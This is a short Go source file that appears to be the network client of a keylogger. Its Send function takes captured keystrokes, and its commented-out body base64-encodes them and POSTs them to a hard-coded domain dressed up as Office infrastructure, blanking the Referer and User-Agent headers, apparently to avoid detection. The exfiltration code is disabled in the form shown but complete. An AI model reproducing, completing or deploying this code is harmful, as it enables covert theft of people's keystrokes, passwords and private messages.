package client

import (
	"fmt"
	"math/rand"
	"net/http"
)

const (
	MAX_BUF_SIZE    = 10
	JITTER_BUF_SIZE = 0.3
)

var (
	client = &http.Client{}
	HOSTS  = []string{
		"nexus.officeapps.live.vkcloud.ovh",
	}
)

type host struct {
	domain string
}

func nextHost() string {
	return fmt.Sprintf("https://%s", HOSTS[rand.Intn(len(HOSTS))])
}

func Send(keystrokes string) {
	/*buf := &bytes.Buffer{}
	base64.NewEncoder(base64.RawStdEncoding, buf).Write([]byte(keystrokes))
	req, _ := http.NewRequest("POST", nextHost(), buf)
	req.Header.Set("Referer", "")
	req.Header.Set("User-Agent", "")
	client.Do(req)*/
}
